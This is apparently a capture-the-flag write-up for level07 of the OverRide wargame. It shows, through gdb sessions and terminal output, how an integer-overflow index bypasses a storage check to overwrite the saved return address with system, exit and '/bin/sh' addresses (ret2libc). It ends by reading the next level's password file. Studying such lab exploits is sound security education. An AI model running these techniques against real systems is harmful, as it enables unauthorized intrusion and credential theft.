# level07

This program is a simple number storage system. It stores and reads number in an array `unsigned int data[100]`. But we cannot store a number with `index % 3 == 0`.

## Step 1. Calculate offset to overwrite `eip`
```assembly
   0x08048924 <+513>:	lea    eax,[esp+0x24]
   0x08048928 <+517>:	mov    DWORD PTR [esp],eax
=> 0x0804892b <+520>:	call   0x80486d7 <read_number>
```
```
level07@OverRide:~$ gdb -q level07
(gdb) break *0x0804892b
Breakpoint 1 at 0x804892b
(gdb) run
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read

Breakpoint 1, 0x0804892b in main ()
(gdb) info registers eax
eax            0xffffd544	-10940
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704,
  eip at 0xffffd70c
(gdb) print 0xffffd70c - 0xffffd544
$1 = 456
```
We set a breakpoint before calling `read_number` function, then get offset `456` by calculating `eip - eax`. For a 32 bit integer array, `eip` locates in `data[114]`.

## Step 2. Find a way to set data[114]
```
level07@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble store_number" level07
Dump of assembler code for function store_number:
[...]
   0x08048666 <+54>:	call   0x80485e7 <get_unum>
   0x0804866b <+59>:	mov    DWORD PTR [ebp-0xc],eax
[...]
   0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080486c5 <+149>:	shl    eax,0x2
   0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]
   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080486ce <+158>:	mov    DWORD PTR [eax],edx
   0x080486d0 <+160>:	mov    eax,0x0
   0x080486d5 <+165>:	leave
   0x080486d6 <+166>:	ret
End of assembler dump.
```
We cannot set `data[114]` directly because `114 % 3 == 0`. The disassembly code shows that left shift 2 position is analogous to multiply by 4. So our goal here is to find a number who satisfies the equation `114 << 2 = X << 2`. We can find three numbers `1073741938, 2147483762 and 3221225586` by flipping bit 30 and bit 31, but `3221225586 % 3 == 0`.

## Step 3. Find ret2libc address
```
level07@OverRide:~$ gdb -q level07
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x8048729
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

system:  0xf7e6aed0 => 4159090384
exit:    0xf7e5eb70 => 4159040368
/bin/sh: 0xf7f897ec => 4160264172
```
We found all 3 pointers to perform ret2libc.

## Step 4. Input numbers into system
```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/$(whoami)/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
